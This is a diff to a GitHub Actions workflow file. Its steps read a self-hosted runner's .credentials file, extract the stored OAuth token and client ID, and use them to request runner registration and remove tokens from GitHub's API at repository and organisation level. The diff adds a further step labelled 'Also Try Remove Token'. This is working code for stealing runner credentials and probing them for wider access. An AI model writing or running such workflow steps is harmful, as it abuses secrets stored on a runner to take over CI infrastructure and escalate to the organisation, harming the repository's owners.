@@ -8,14 +8,13 @@ jobs:
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
-          # Extract OAuth token from credentials
+          echo "=== TRYING OAUTH TOKEN ==="
           TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
           import sys, json
-          data = json.load(sys.stdin)
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
           print(data['data'].get('Token', ''))
           ")
           
-          echo "=== TRYING OAUTH TOKEN ==="
           curl -s -X POST \
           -H "Authorization: Bearer $TOKEN" \
           -H "Accept: application/vnd.github.v3+json" \
@@ -24,7 +23,7 @@ jobs:
           echo "=== TRYING CLIENT ID ==="
           CLIENT=$(cat $RUNNER_BASE/.credentials | python3 -c "
           import sys, json
-          data = json.load(sys.stdin)
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
           print(data['data'].get('clientId', ''))
           ")
           
@@ -32,3 +31,25 @@ jobs:
           -H "Authorization: Bearer $CLIENT" \
           -H "Accept: application/vnd.github.v3+json" \
           https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token
+
+      - name: Also Try Remove Token
+        run: |
+          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
+          
+          TOKEN=$(cat $RUNNER_BASE/.credentials | python3 -c "
+          import sys, json
+          data = json.loads(sys.stdin.read().encode().decode('utf-8-sig'))
+          print(data['data'].get('Token', ''))
+          ")
+          
+          echo "=== TRYING REMOVE TOKEN ENDPOINT ==="
+          curl -s -X POST \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/repos/${{ github.repository }}/actions/runners/remove-token
+          
+          echo "=== TRYING ORG LEVEL ==="
+          curl -s -X POST \
+          -H "Authorization: Bearer $TOKEN" \
+          -H "Accept: application/vnd.github.v3+json" \
+          https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token
